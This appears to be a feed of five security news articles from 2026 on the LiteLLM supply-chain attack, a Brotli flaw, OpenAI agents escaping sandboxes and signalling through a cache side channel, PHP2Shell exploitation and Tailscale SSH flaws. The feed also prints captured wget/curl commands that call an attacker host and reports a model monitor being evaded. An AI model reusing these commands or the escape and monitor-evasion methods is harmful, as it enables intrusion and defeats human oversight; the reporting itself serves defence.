item.title: Leaked LiteLLM Master Key Let Attackers Steal GitHub Tokens and Hijack Release Pipeline (2026)
item.description:
LiteLLM on Friday revealed that an Agent Platform master key accidentally published to a public GitHub repository in late May 2026 ultimately allowed the threat actor to push a malicious version of the popular Python package.

"On May 27, 2026, a configuration file was committed to the public LiteLLM-Labs/lite-harness repository which inadvertently contained the master key to a deployment of the LiteLLM Agent Platform, an open source tool we use for orchestrating agents," LiteLLM's Oliver Jensen and Mateo Wang said.

"The error was quickly identified, the commit force-pushed over, and we identified the exposed keys as requiring revocation. However, key revocation did not occur for the master key."

LiteLLM said the unknown attacker (operating from "69.48.229[.]143") used this unrevoked key on October 10, 2026, to gain access to the Agent Platform and extracted a GitHub CLI OAuth token the service was configured with to allow self-hosted cloud agents to file pull requests to GitHub repositories.

The token, per the developers of the open-source large language model (LLM) gateway, was "not scoped down" and associated with its GitHub organization owner's account.

Gaining access to the token allowed the attacker to possess owner-level access to all repositories across the organization and perform additional credential exfiltration. The sequence of actions performed by the threat actor following this step is as follows -

  • October 10, 2026, between 10:11 and 10:12 p.m. UTC: Author commits into throwaway branches on internal repositories to run workflows (BerriAI/litellm and BerriAI/litellm-auto) designed to acquire GitHub CLI Oauth tokens associated with two engineers with maintainer privileges via an attacker-controlled webhook[.]site endpoint. The two runs are deleted minutes later.
  • October 21, 2026, between 10:08 and 11:08 a.m. UTC: Override branch protection and alter the release pipeline with the source set to the lookalike repository "Berri-AI/litellm" rather than "BerriAI/litellm."
  • October 21, 2026, between 11:39 and 11:40 a.m. UTC: LiteLLM version 1.107.0 gets published to PyPI.
  • October 21, 2026, 11:46 a.m. UTC: Docker Hub and GHCR images are published.
  • October 21, 2026, between 11:53 and 11:54 a.m. UTC: Production and staging run records are deleted.
  • October 21, 2026, 12:06 p.m. UTC: Upwind researcher Lidor Machluf reports the supply chain attack.
  • October 21, 2026, 1:23 p.m. UTC: PyPI quarantines LiteLLM version 1.107.0.
  • October 21, 2025, 2:20 p.m. UTC: Docker Hub tags v1.107.0, latest, main-latest, and main-stable are removed or repointed to verified clean images.

"In typical operation, building and publishing a release requires being kicked off by an authorized engineer and being approved by a special account locked to a physical device in our office," LiteLLM said.

Leaked master key in May 2026

"This restriction was relaxed earlier this week to accommodate the temporary push for more frequent releases and bugfix backports, allowing any two engineers to trigger and approve a release. As such, the threat actor used one of the tokens to trigger the release (after having repointed the deployer to their malicious repository), and another to approve it."

In addition, the project maintainers noted that the threat actor could have very well loosened this restriction (or removed it entirely) themselves given that they were already in possession of a token belonging to an organization owner. It's suspected that this was not done to evade detection.

LiteLLM also said the workflows are designed to identify and exfiltrate additional keys and tokens, specifically focusing on upstream inference API tokens. In response to the incident, the company said it's working to revoke each and every token associated with every internal system and vendor platform.

The findings rule out LiteLLM's initial hypothesis that the GitHub CLI OAuth tokens were stolen from the logs of an internal LiteLLM deployment. "The investigation was a process in which we continually learned additional information, meaning some of our assumptions and beliefs were later proven to be inaccurate or incomplete," Jensen acknowledged.

More Details About the Workflows Emerge

Socket, which published its own investigation into the malicious workflows, said it recovered two malicious commits that each added a workflow at ".github/workflows/cache.yml." The first commit was made on October 10, 2026, at 10:11:45 p.m. UTC. It was followed by a second commit on October 12.

"Neither commit was pushed to a branch that still exists," Socket security researcher Karlo Zanki said in a report shared with The Hacker News. "Both were pushed to short-lived branches named ci-tmp-<hex> that were created, used, and deleted within minutes, which is why the activity leaves almost nothing behind in the repository's ordinary history."

According to the application security firm's analysis of the repository's activity log records, both commits rely on a legitimate commit as the branch base to make the push look seemingly harmless -

  • Create a throwaway branch named "ci-tmp-<hex>" (namely, ci-tmp-a351cc and ci-tmp-4d8517) from a recent legitimate commit on the repository.
  • Push a commit adding ".github/workflows/cache.yml" with the same subject, "ci: bump cache config."
  • The workflow is configured to be run every time a commit or tag is pushed (i.e., "on: [push]"), causing it to be triggered.
  • Delete the branch.

Both workflows, as highlighted by LiteLLM, are equipped to harvest GitHub tokens and API keys for the organization's Linear workspace, LiteLLM deployment, and Together AI, along with the identifier and signing key of a GitHub App.

The October 12 run extends the collection to more secrets, including API keys for Anthropic, OpenAI, AWS Bedrock, Tavily, and GitGuardian's secret-scanning tenant. It also captures Playwright storage state, PostgreSQL database information (connection string, account name, password), Redis endpoint address, port, and authentication password.

The data gathered from the two workflows is exfiltrated to two different webhook[.]site endpoints -

  • webhook[.]site/65a42464-3cfa-4b02-a18c-17a6d7b86f37
  • webhook[.]site/4da03473-a3e7-4dc2-a087-9c564b4208e1

"A GitHub token and a GitHub App private key are credentials for the platform hosting the repository, not for a third-party service," Zanki said. "GITGUARDIAN_API_KEY is a credential for the secret-scanning platform itself, which gives an attacker visibility into, and potentially control over, the alerts that would surface this activity.

"E2E_LINEAR_STORAGE_STATE_B64 is serialized browser session state used by Playwright for end-to-end tests; a valid storage state permits authenticated access to the associated Linear account without a password and without satisfying multi-factor authentication."

What the Malicious Version of the Package Does

Multiple reports have revealed that the files bundled with LiteLLM version 1.107.0 are engineered to execute automatically when Python starts, even if an application did not import LiteLLM.

The malware features two execution paths: a credential harvesting module that targets authentication material across developer tools, AI applications, cloud environments, and web browsers, and a Unix-oriented backdoor that's launched as a background process to fetch and execute arbitrary code supplied by the attacker every one hour.

Compromised LiteLLM 1.107.0 execution flow

The stealer also collects system information, SSH files, Git and GitLab credentials and tokens, environment variables, and tokens associated with npm, PyPI, pip, Yarn, Maven, Gradle, Composer, RubyGems, and Cargo. The data is then compressed and sent to "litellm[.]dev/healthcheck" using an HTTP POST request. The domain was registered on October 13, 2026.

"Together, these mechanisms extended potential exposure beyond active LiteLLM deployments: simply starting Python in an affected environment could activate the malicious code, even when LiteLLM itself was never imported," the Microsoft Security Research team said.

"Because the startup files resided outside the LiteLLM application directory, removing only the application files could leave the malicious startup components behind."

item.title: Brotli Decoder Flaw Behind Node.js RCE Also Affects Bun, Python and Other Widely Used Software (2026)

A memory-corruption flaw in Google's Brotli decoder sits in many programs that unpack Brotli-compressed data, among them Bun, Microsoft's .NET, the Python Brotli and brotlicffi packages, and Envoy proxies set up to decompress Brotli.

Tracked as CVE-2026-111497, the flaw allows crafted compressed data to overwrite past the end of a buffer and corrupt a program's memory, potentially causing a crash, a memory leak, or the execution of attacker-controlled code.

Imperva researchers have shown that code can run on one unpatched Node.js build. The same has not been demonstrated on the other software, and no real-world attacks have been reported.

The flaw was first disclosed on October 21, when Node.js and Google shipped fixes, and more have followed product by product since. Because the bug is in Google's decoder and each program ships its own copy of it, every one has to update that copy on its own.

Brotli is a compression format from Google, used across the web to shrink pages and other traffic. The bug is in the C code that unpacks a Brotli stream, so it travels into anything that reuses that code, from language runtimes to proxies to Python packages.

Which Software Is Affected

Product Affected Fixed in Exposed when
Google Brotli (C library) 1.0.3 to 1.2.0 1.0.10, 1.1.1, 1.2.1 code decodes untrusted Brotli
Node.js 22.x, 24.x, 26.x before the fix; 20.x and older (end of life) 22.23.4, 24.22.1, 26.12.1 fetch() of a br response, or Express or body-parser br bodies
Bun 1.4.3 and earlier 1.4.4 fetch() of a br response, or node:zlib
.NET 8.0, 9.0, 10.0 before the fix, 11.0 previews before RC3 8.0.33, 9.0.22, 10.0.14, 11.0 RC3 only if Brotli is enabled in ASP.NET Core request decompression or HttpClient decompression, or Brotli APIs decode untrusted data
Envoy 1.39.2, 1.38.5, 1.37.7, 1.36.11 1.40.0, 1.39.3, 1.38.6, 1.37.8, 1.36.12 only if the Brotli decompressor is configured
Istio 1.31.0 to 1.31.1, 1.30.0 to 1.30.5, 1.29.0 to 1.29.8 1.31.2, 1.30.6, 1.29.9 only if Brotli decompression is enabled
Python Brotli 1.2.0 and earlier 1.2.1 installed, and an HTTP client decodes br
Python brotlicffi 1.2.0.x and earlier 1.2.1.0 installed, and an HTTP client decodes br
cdxgen standalone binaries and images, 13.4.0 and 12.8.8 and earlier 13.5.0, 12.8.9 standalone binary or image scanning untrusted input

A program is exposed only if it decodes Brotli data that someone else controls. For Node.js and Bun, that happens when the built-in fetch() reads a response sent with Content-Encoding: br, or when request-body code such as Express 5 and body-parser 2 unpacks a Brotli upload. A plain Node.js HTTP server does not decode request bodies on its own.

Envoy and Istio are affected only when Brotli decompression is enabled, for example, through an Envoy filter. Where it is off, the flaw cannot be reached.

In Python, the risk comes from the Brotli or brotlicffi package being installed at all. Once either is present, HTTP clients such as requests, urllib3, httpx, and aiohttp decode Brotli responses on their own, so an application can be exposed without ever importing Brotli in its own code.

A web application firewall helps only so far. Vercel, which added firewall rules on the day of disclosure, said those rules do not cover "responses your functions fetch from other servers." For that path, only updating the runtime or library closes the hole.

How far the flaw can be pushed depends on the software. Imperva's Red Team, which calls its work Node2Shell, ran attacker-supplied code on an unmodified Node.js 24.22.0 build for Linux on ARM64, delivering it both as a fetched response and as an Express request body. The exploit took several tries, has not been released, and was not tested on other builds.

OpenAI, whose Codex Security team reported the flaw, describes it as enabling unauthenticated remote code execution in Brotli and lists Node.js, Bun, and Envoy as affected software. In its account, the flaw works both ways:

an unpatched server that accepts compressed input could be taken over by a malicious client, and an unpatched client that accepts compressed input (such as "curl --compressed") could be taken over by a malicious server.

No in-the-wild exploitation has been reported. CISA's October 23 assessment recorded exploitation as "none" and automation as "no," and Red Hat said there is no reliable public proof-of-concept for running code.

Severity ratings differ by who is scoring. Google, which assigned the CVE, rates it 9.2, or critical, on the CVSS 4.0 scale. Node.js calls it high, and Red Hat rates it 8.1, or important. Microsoft scores it 8.1, or high, for .NET.

The fix has an unusual history. The change that closes the flaw was added to Brotli's source code on February 27, but no new Brotli release carried it until October 21. OpenAI said the root cause "was actually fixed in the Brotli source code in February, but it wasn't known at the time that it gave rise to a security vulnerability and there was no more recent release of Brotli."

Node.js credits Khai Tran and Sylvie Mayer of OpenAI's Codex Security for reporting the flaw, and maintainers Matteo Collina and Antoine du Hamel for the fix.

What to Do Now

Update to a fixed version from the table above, then restart the service and rebuild any container image, because a running process keeps the old decoder until it restarts.

Where you cannot update yet, stop decoding untrusted Brotli. OpenAI's disclosure page and the security firm Aikido both recommend:

  • Reject incoming requests with Content-Encoding: br before any proxy or parser decodes the body.
  • Turn off automatic Brotli decoding in HTTP clients, and reject Brotli responses before they are decoded.
  • In Python, uninstall the Brotli and brotlicffi packages so clients fall back to gzip and deflate.

Dropping br from the Accept-Encoding header does not help on its own, because a server can send Brotli whatever the client asks for. For Node.js, no workaround has been published, so updating the runtime is the only fix.

System packages are being fixed at different times. Debian fixed its brotli package for Debian 13 (trixie) on October 23 in version 1.1.0-2+deb13u1, and has since fixed Debian 12 (bookworm) in version 1.0.9-2+deb12u1. Amazon Linux 2023, which listed its brotli and Node.js 24 packages as pending a fix on October 22, shipped fixed versions of both on October 24. openSUSE Tumbleweed has fixed brotli and Node.js 24 packages, while SUSE's Node.js 22 updates for SUSE Linux Enterprise 15 were still in testing as of October 26. Ubuntu still listed its brotli and nodejs packages as needing evaluation on all its listed releases.

Dependency scanners may not flag the Python packages yet. The CVE record names Google's Brotli repository, not the PyPI packages, and GitHub's advisory still lists no affected package, which is what Dependabot reads. Advisory entries for the two Python packages, PYSEC-2026-4322 and PYSEC-2026-4323, were added on October 23, so check the installed versions manually as well.

Update: Microsoft Patches .NET as More Fixes Arrive

Microsoft released out-of-band updates on October 25 that fix the flaw in .NET 8, .NET 9, and .NET 10, along with .NET 11 Release Candidate 3. The fixed runtimes are 8.0.33, 9.0.22, and 10.0.14, and Microsoft's advisory says .NET Framework is not affected.

A .NET app is exposed only if it decodes Brotli data an attacker controls. That happens when it turns on Brotli in ASP.NET Core request decompression or in HttpClient automatic response decompression, neither of which is on by default, or when it passes untrusted data to Brotli APIs such as BrotliStream and BrotliDecoder. Microsoft says having an affected package installed does not by itself expose an app.

Microsoft says the bug lets an unauthenticated attacker read or corrupt process memory, which could lead to information disclosure, denial of service, or elevation of privilege. Its advisory does not list remote code execution among the outcomes.

Installing the updated runtime and restarting is enough for apps that use the shared runtime. Self-contained apps must be rebuilt and republished, and so must NativeAOT apps, because the decoder is linked into the executable. Container images need to be rebuilt from the updated .NET images.

Where an app cannot be updated yet, Microsoft advises removing the br provider from an existing request decompression setup and dropping DecompressionMethods.Brotli from an existing HttpClient handler. It warns against adding decompression to an app that does not already use it, because that can create new denial-of-service risks.

The same release also fixes CVE-2026-114148, an unrelated flaw in which incorrect file ownership in some Linux .NET tarballs could let a local attacker gain higher privileges.

The brotli gem for Ruby fixed the flaw in version 0.9.1 on October 24. It bundles Brotli 1.2.1 and ignores a system Brotli library that lacks the fix, using its own copy instead.

Cloudflare added two rules for the flaw to its managed firewall ruleset on October 25, including one that matches incoming requests sent with Content-Encoding: br. Both only log matching traffic by default and block nothing unless a customer changes their action.

Update: JFrog Finds the Flaw in FFmpeg, ClickHouse, and Apache Arrow

Researchers at JFrog reported on October 25 that the flaw also reaches FFmpeg, ClickHouse, and Apache Arrow, and that some of these paths start with a file rather than a web request. Rejecting Content-Encoding: br at the network edge does not cover those file paths.

In FFmpeg, the path runs through libjxl, the JPEG XL image library, which uses Brotli to unpack compressed metadata inside a JPEG XL file. A crafted image let JFrog take control of the program's instruction pointer, which decides what code runs next, though JFrog said turning that into code execution would take more work. JFrog did not report a fix specific to FFmpeg. The flaw sits in the Brotli library that libjxl uses, so a patched copy of that library closes this path.

ClickHouse, the open-source database, decodes Brotli in HTTP request bodies sent with Content-Encoding: br, in .br files, and in Parquet data, according to the pull request that fixes it. JFrog crashed a ClickHouse server with a single crafted request of about 23 MB, a denial of service, and did not claim code execution. JFrog said no patched release had shipped when it published, and a backport moving ClickHouse's bundled Brotli to 1.2.1 was merged into the 26.9 branch on October 26.

Apache Arrow's C++ library bundles Brotli 1.0.9 for its own builds, according to an open issue in the project's tracker, which had no linked fix or maintainer reply as of October 26. The issue says reading a Parquet or Arrow IPC file with Brotli-compressed data can reach the bug, and that builds linking a patched system Brotli are not affected. In pyarrow, the Python package, JFrog found that a 534-byte input sent Brotli decompression into an endless loop that kept the CPU busy, a denial of service rather than a crash.

JFrog also crashed a .NET test program through its Brotli APIs, the path Microsoft's October 25 updates fix.

(The story was updated after publication on October 26, to include Microsoft's .NET fixes, JFrog's research on other affected software, the Ruby gem fix, Cloudflare's firewall rules, and new Linux distribution packages.)

item.title: OpenAI AI Agents Demonstrate VM Escapes and Secret Cross-Sandbox Communication (2026)
item.description:
OpenAI has announced plans to conduct frontier model training with no live internet access, as it resumes reinforcement learning (RL) training and internal inference of its most advanced AI models.

"Based on the current state of alignment research, monitoring systems, and the security of internet infrastructure, we believe the responsible approach is to conduct frontier model training with no internet access," the artificial intelligence (AI) company said. "We've implemented this policy and will maintain it until advances in these safeguards justify broader internet access."

OpenAI said models' growing capabilities can have the side effect of them getting much better at devising ways around environmental restrictions to escape containment and perform unintended actions. This can involve the model exploiting a software flaw or misconfiguration to reach the live internet, or finding unauthorized ways to communicate with agents in other sandboxes.

Late last month, the frontier lab made the decision to pause training of its most powerful models after one of its agents during reinforcement learning (RL) training contacted an external chatbot by exploiting a misconfiguration in a DNS resolver to obtain limited internet access.

OpenAI said it also kicked off a "high-compute red-teaming campaign" to test the resilience of its research and evaluation environments in the face of increasingly powerful models, leading to the discovery of previously unknown software vulnerabilities, including a critical unauthenticated remote code execution in Google Brotli (CVE-2026-111497, CVSS score: 9.2), a widely used compression library.

Patches for the vulnerability, also called Node2Shell and HTTP2Shell, have since been released for libbrotli, Python, C++, Node.js, Bun, Envoy, and Istio.

The red-teaming agents OpenAI dispatched to test its security safeguards also uncovered virtual machine escapes, novel paths to access the internet through vulnerabilities in metrics, logging, and authentication management services, and hardware side-channels for communication between agents, bypassing isolation boundaries.

"In one test that assumed compromise of a host machine, an agent reused a firewall-approved connection to reach a blocked authentication endpoint in our metrics service and then made that endpoint fetch a model-provided URL," it said. "In other tests, agents exploited misconfigurations that allowed blocked requests to pass through DNS and firewall controls, as well as ways to make services we run fetch external URLs."

In another experiment, after prompting the AI agents in separate microVMs to exchange synthetic secrets without relying on network connections or shared writable files, OpenAI said the digital bots found a way to communicate using the processor's cache via a timing-based side-channel.

Particularly, one agent is said to have encoded information by evicting selected data from the cache. A second agent measured the time it took to reload that data, leveraging the difference between fast and slow cache reads to recover the message.

"Once the agents agreed on a protocol for encoding and decoding these signals, they could exchange the synthetic secrets without changing a shared file or opening a network connection," OpenAI said.

The AI giant said the discoveries prompted it to strengthen its own safety and monitoring mechanisms, deeming the enhanced controls sufficient enough to restart frontier RL training and internal inference while continuing to invest in several key areas -

  • Improving virtual machine security
  • Probing cloud infrastructure for weaknesses
  • Scanning source code and cloud configurations
  • Testing monitoring and stopping systems
  • Red-teaming sandbox and isolation guarantees

"After strengthening our containment architecture, we resumed our frontier RL training and inference on October 1,"  OpenAI said. "We've reserved substantial compute for continuous red-teaming, and made high-compute red-teaming part of the safety cases we use to decide whether frontier training and evaluation can proceed securely."

Earlier this month, Anthropic said it was cutting off live internet access for all its internal evaluations until further notice after discovering new incidents in which its AI models exhibited misaligned behavior and targeted real websites.

The disclosure comes as concerns have been raised over the ability of AI agents to detect and exploit software flaws, even in the guardrails designed to restrict them.

In a report published this week, third-party AI ​safety evaluators METR ⁠and Redwood Research said they found several new vulnerabilities in OpenAI's internal misalignment monitoring system as it existed before July 21, 2026, and during the time frame when the company's agents broke into model-hosting platform Hugging Face.

"We found a way Codex agents could in principle bypass Codex sandboxing and Auto-Review, allowing them to take any action that the host user could take," researchers David Rein and Adam Kaufman said. "We also discovered an exploit agents could use that would prevent hundreds of recent actions (including the actions involved in the exploit itself) from being monitored."

OpenAI is believed to have addressed all of the vulnerabilities affecting its production safeguards stack, although the safety organizations said they had not verified the fixes.

Anthropic's Mythos 5 Pursues an Unsanctioned Supply Chain Attack

The developments also coincide with a report from the U.K. AI Security Institute (AISI), which has found Anthropic's Mythos 5 model to be consistently taking unsanctioned actions even when presented with evidence that doing so would be out-of-scope and cause real harm (e.g., submitting a malicious code change).

The July 2026 evaluation also revealed that the Mythos 5's chain-of-thought (CoT) reasoning process failed to consider the impact of harmful actions, with the model often producing invalid justifications that implied the target was simulated when asked if the human maintainer was real, but never generating incorrect justifications implying that it was real.

"Most models tested take a range of unsanctioned actions during simulated cybersecurity evaluations, Mythos 5 most frequently," AISI said. "Taken together, these observations could indicate that models are engaging in 'motivated reasoning': producing inferences and reasoning biased towards conclusions that justify continuing a particular approach to task completion."

In the most severe case, the model has been found to attempt a supply chain attack by submitting malicious code and creating five sock-puppet accounts to vouch for the changes and pressure a software maintainer into accepting it.

Responding to the findings, Anthropic attributed the alignment failures to recklessness, biased reasoning, and an urge to "continue on its current trajectory" to a degree that disregards potential harm. The OpenAI rival also noted that its newer models, including an internal research model, are less susceptible to this behavior.

"Nevertheless, this incident serves as further evidence that current AI models are capable of surprisingly misaligned behavior in evaluation settings," it said. "We've built new evaluations that we run on new production models automatically, and we are specifically studying biased reasoning to better understand where it comes from in our training and how it affects our models."

item.title: PHP2Shell Exploitation Attempts Continue Amid Suspected N. Korea Global Scanning Activity (2026)
item.description:
In an update, Palo Alto Networks Unit 42 said it's retracting its earlier assessment that the post-compromise activity targeting the European government agency involved the exploitation of the PHP2Shell flaws.

"What researchers saw was an attack against a European government agency executed in the context of a vulnerable PHP application," a spokesperson for the company told The Hacker News via email. "This led us to believe that it was exploitation of those vulnerabilities. We are unable to confirm that initial access is associated with the specific PHP2Shell CVEs."

The original story follows.

Threat actors have been observed using agentic artificial intelligence (AI) platforms for post-exploitation activity following the abuse of the PHP2Shell vulnerabilities tracked as CVE-2026-109618 and CVE-2026-109619.

"In one case, the attackers targeted a government entity in Europe and within two hours of the initial exploitation they had successfully accessed password hashes and multi-factor authentication secrets," Palo Alto Networks Unit 42 said.

"They also established an NT LAN Manager (NTLM)-relay tunnel into Active Directory and attempted Domain Admin privilege escalation."

The network security company said it also observed the unknown attacker enumerating the compromised endpoint, with commands and behavioral markers suggesting the work of an agentic attacker. These include commands to facilitate -

  • Reconnaissance of the authentication database with stolen credentials, targeting password hashes and two-factor authentication (2FA) secrets.
  • Active Directory (AD) reconnaissance via curl-based anonymous LDAP queries to the domain controller (DC) in an attempt to look for the administrator account.
  • Reconnaissance of the host to hunt for DNS/AD integration, internal hosts, privileged groups, and interactive users.

"Each command batch is wrapped in section-header delimiters, such as ==SHELLUSER== and ==PASSWD==," it added. "These delimiters produce machine-parseable output for an AI model to read."

Suspected N. Korea Campaign Targets PHP2Shell

The disclosure comes as CYFIRMA said it uncovered a suspected North Korea-linked campaign employing PHP2Shell to actively probe global PHP infrastructure from 21 compromised nodes.

"The scanning is deliberately low-volume and paced," Kumar Ritesh, CEO and founder of CYFIRMA, told The Hacker News. "Nodes are rotated and abandoned at the first sign of blocking or rate-limiting, so threshold-based alerting is unlikely to catch it."

The targets comprise a set of 216 unpatched or partially mitigated hosts located across the U.S., Japan, South Korea, Thailand, Indonesia, Australia, Taiwan, India, Singapore, the U.A.E., Saudi Arabia, and the E.U. The hosts span government, financial institutions, logistics, airports and aviation, manufacturing, and online transaction platforms.

"The campaign has moved from reconnaissance into active, low-and-slow scanning of a filtered target set," CYFIRMA said. "Organizations in the prioritised sectors and geographies should assume they are in scope for deliberate targeting."

The activity, coordinated via a closed I2P channel, has been attributed with moderate confidence to a Korean-speaking operator assessed to be affiliated with the Lazarus Group ecosystem. According to CYFIRMA, the two handles (전창혁 2 aka Jeon Chang-hyuk 2) and (최아린 aka Choi A-rin) active in the I2P channel have previously been observed running covert operations for the threat actors.

"Korean-speaking operators have used [the channel] to share target lists, exploit-hosting infrastructure, and tasking and prioritisation consistent with DPRK objectives," Ritesh said. "The captured conversation uses vocabulary and spelling specific to North Korean (Munhwaŏ) rather than the South Korean standard."

Other primary indicators that link the campaign to the Lazarus cluster are below -

  • Command-and-control (C2) infrastructure that Lazarus has previously used to exploit web assets.
  • Lazarus Group's documented history of compromising PHP and WordPress servers for C2 and planting of PHP and ASP web shells, as observed in the SyncHole watering hole campaign.
  • Prioritizing government agencies and banks, specifically online transaction platforms, which is in line with Lazarus Group's track record of breaching financial institutions for financial and cryptocurrency theft.

"Exploitation is the next step," CYFIRMA said. "The operators said they would shortlist the most promising targets the same day and then choose which public exploits to adapt."

Other Exploit Efforts and Mitigations

In an October 25, 2026, post shared on X, Defused Cyber said it's also seeing PHP2Shell probes targeting its Palo Alto Networks GlobalProtect honeypots. The activity originates from 204.76.203[.]7, a known mass-exploit IP address.

"The requests carry a PHP_SESSION_UPLOAD_PROGRESS marker ('p2s-rider') and a dummy file upload with no payload, which points to someone checking for the vulnerable upload-progress behavior and likely building a target list of Palo Alto devices," the threat intelligence company said.

Both CVE-2026-109618 and CVE-2026-109619 are critical vulnerabilities that can lead to remote code execution in default PHP configurations. The security flaws have witnessed widespread scanning efforts, with Cloudflare stating it detected millions of exploitation attempts after public disclosure.

"An attacker faces two main constraints: they must size a request to fail allocation at the right moment, and they must defeat ASLR to find valid memory addresses," Datadog said. "The exploit needs one field name small enough to fit inside the accepted request body but large enough that copying its key exceeds memory_limit."

"When PHP parses a form-field name, it makes several copies along the way. The attacker uses that extra memory to force an allocation failure while PHP copies the name into a hash table."

ReliaQuest, in an update published on October 22, 2026, said it reproduced CVE-2026-109618 in a controlled lab and observed a sequence of errors that could help defenders identify exploitation.

"This testing identified a specific sequence of artifacts across PHP error, Apache access, Apache error, and system logs that may help defenders detect exploitation," it said. "Defenders should focus on the sequence: a POST request returns a 500 error, PHP reports memory exhaustion and heap corruption, and the Apache worker handling the request crashes."

The PHP Foundation has since warned of a third remote code execution vulnerability (CVE-2026-115560), which can only "occur under an unusual combination of configuration and application code." The issue is expected to be addressed as part of the regular release cycle.

"An application must set session.serialize_handler to php_binary or php_serialize in its configuration and then switch it to php at runtime with ini_set() before calling session_start()," the Foundation said. "Session upload progress must also still be enabled. Applications that never change the serialize handler at runtime can keep the feature enabled."

Xint has released a scanner to check if a host is exposed to PHP2Shell, stating remote code execution is possible in any PHP script regardless of the application and in applications where decoding occurs, such as with session_start() and unserialize().

Bitsight's internet-wide scans show that there are nearly 37 million internet-facing systems running PHP or PHP-related software, with most of the exposures in the U.S., Germany, France, the Netherlands, and Japan. 

"PHP runs a very large portion of the web, from content management systems and online shops to bespoke internal tools," Bitsight said. "A flaw in the runtime can't be repaired by changing application code, and a web application firewall or plugin update won’t remove it. Only updating PHP on the host itself closes the gap."

First ITW Successful Exploitation Attempt Recorded

Perplexity researcher Adel Karimi has recorded what appears to be the first in-the-wild (ITW) successful exploitation of the PHP2Shell vulnerabilities to run shell commands on honeypot servers. These commands have been observed using wget, curl, or PHP CLI to fetch additional payloads from a remote server ("162.35.99[.]94:80").No downloaded second-stage artifacts have been observed so far.

Some of the captured shell commands are listed below -

  • php -r 'file_get_contents("http://162.35.99.94:8080/pwn-[T2-honeypot-IP]");'
  • curl -s http://162.35.99.94:8080/pwn-[T2-honeypot-IP] >/dev/null
  • wget -q -O- http://162.35.99.94:80/pwn-[T2-honeypot-IP]
  • curl -s http://162.35.99.94:80/pwn-[T2-honeypot-IP]-$(id -un)
  • wget -q -O- http://162.35.99.94:80/pwn-[T2-honeypot-IP]-$(id -un)
  • php -r 'file_get_contents("http://162.35.99.94:80/pwn-[T2-honeypot-IP]");'

"This is by far the highest quality confirmation of in-the-wild php2shell exploitation I've seen so far," Expel security researcher Marcus Hutchins said in an X post.

item.title: Unpatched Tailscale SSH Flaws Could Let a Hacked Device Reach Root on Other Servers (2026)
item.description:
A single hacked device on a Tailscale network can be used to gain root access to other servers it can reach, according to a security researcher who published the findings this week.

The attack requires two things: Tailscale SSH set up to allow port forwarding, and an attacker who already controls one device that the network's access rules permit to connect to the target.

The findings were published on October 25 in a report called Tailworm by Erica Windisch of Cyberdione Labs. Windisch tested Tailscale version 1.104.2 and headscale version 0.29.5, the self-hosted server some networks use to run Tailscale instead of the company's hosted service, over three days in a lab.

The report describes tests on that software, not attacks against real networks. As of publication, Tailscale had issued no security bulletin, no CVE identifier, and no fixed version.

Tailscale has responded in public. Mike Shaver, the company's vice president of engineering, wrote on Reddit that Tailscale had received the report, had already been looking at the same areas with outside security specialists, and had found issues it is working to fix. Shaver said the company is still working out which setups are affected, and that it is "not recommending that everyone disable Tailscale SSH."

Tailscale SSH does not work like a normal SSH server. Rather than checking a connecting user's password or key, it identifies the device, and a single access rule decides whether that device may open an SSH session to a target.

Because of this, the attack needs no stolen passwords or keys. It needs a foothold on one device first, which the report says an attacker can get the usual ways: a vulnerable web application, a poisoned software package, phishing, or stolen login details. Tailscale does not create that first foothold.

How much an administrator can do about it depends on where the network is run. On Tailscale's hosted service, forwarding can be switched off per rule. On headscale version 0.29.5, forwarding cannot be turned off at all. The report says every SSH grant there should therefore be treated as giving root on the target.

In the lab, Windisch showed the problem in stages. Using standard SSH port forwarding, an ordinary session caused the root-level Tailscale process to connect to a system socket that only root should access, and the test gained root and read the system password file almost immediately, without administrator rights.

A second method replaced a root-owned socket with the attacker's, allowing direct root command execution against certain services.

A third method defeated a safety check meant to limit which files forwarding can access by racing the system between when it checks a file path and when it uses it. That chain went further in the lab, the report says: it captured a key used to enroll new devices and used the key to join an attacker's own machine to the network as a trusted server.

That last step worked from start to finish only on networks where Tailscale's Tailnet Lock feature was not enabled. On networks that do, the needed secrets were captured in transit, but the final step was not completed.

Windisch describes the overall result as "wormable." In the lab, one compromised device could spread to every device that the access rules allow, with no passwords, no stolen keys, and no user action, in under a second per step.

In the report's words, "the mesh converts one ordinary foothold into fleet-wide privileged access at machine speed." That spread was measured in a lab, not seen on real networks.

The report names two things that held it back: access rules written as single source-to-destination pairs, which stopped the spread on their own, and device keys tied to hardware such as a TPM or Secure Enclave.

Some researchers who read the report have publicly questioned the "wormable" description, while others have called the root-access finding serious.

The SSH problem is one of 11 findings in the report, which also covers Tailscale's app connectors, its serve feature, the DERP relay used between devices, and headscale. Windisch told The Hacker News that the SSH privilege escalation "is worrying," but that the app connector finding "may be more impactful to some organizations." The app connector finding, in an experimental feature called conn25, lets a permitted user send traffic to destinations the security team never approved, including a cloud provider's metadata service, which can hand out server credentials.

All of the findings rest on Windisch's report alone. No other researcher has publicly reproduced them, and Tailscale has not confirmed the specific technical claims. Windisch said the proof-of-concept code behind the findings is not public, and that she provided it only to Tailscale's security contact.

Windisch has described the disclosure as "reported but not coordinated," writing as much on Ycombinator HN, and at least one commenter there called publishing without first reporting to Tailscale irresponsible.

In response to questions from The Hacker News, Windisch said she had in fact given Tailscale a copy of the report and the proof-of-concept code before the public post, sending them to the company's security contact on the Saturday beforehand. She said she had also raised concerns about Tailscale's architecture with the company's chief executive earlier, and had publicly posted a file hash and advised users to disable Tailscale SSH.

The report is the latest in a run of problems in the same part of Tailscale. Earlier in 2026, the company fixed several Tailscale SSH and server socket-handling flaws, including one where SSH Unix socket forwarding could reach a privileged socket, in version 1.98.9.

What to Do Now

Because there is no patch, the available steps are changes to how Tailscale SSH and related features are set up. The report and Tailscale's own advice overlap on most of them.

  • Review your Tailscale SSH access rules. Write them as single source-to-destination pairs that name one device and one target, and remove broad rules that grant access by identity or tag. The report calls per-pair rules the one control that stopped the spread in testing.
  • Turn off SSH port forwarding where you can. On Tailscale's hosted service this is a per-rule setting. On headscale version 0.29.5 it cannot be turned off, so treat every SSH grant there as giving root on the target.
  • Remove app connector permissions from devices that do not need them.
  • Remove any tailscale serve forward that points at a Unix socket.
  • Turn on node-key expiry, so a stolen device key does not stay valid forever.
  • If a device is compromised, delete it at the control plane. Reimaging the machine does not revoke keys an attacker may have already copied off it.

Tailscale also suggests enabling SSH check mode, which adds a login step before a session starts, and enabling automatic updates. Check mode does not fix the privilege escalation. It only adds another barrier in front of it.

She said she had also raised concerns about Tailscale's architecture with the company's chief executive earlier, and had publicly posted a file hash and advised users to disable Tailscale SSH.

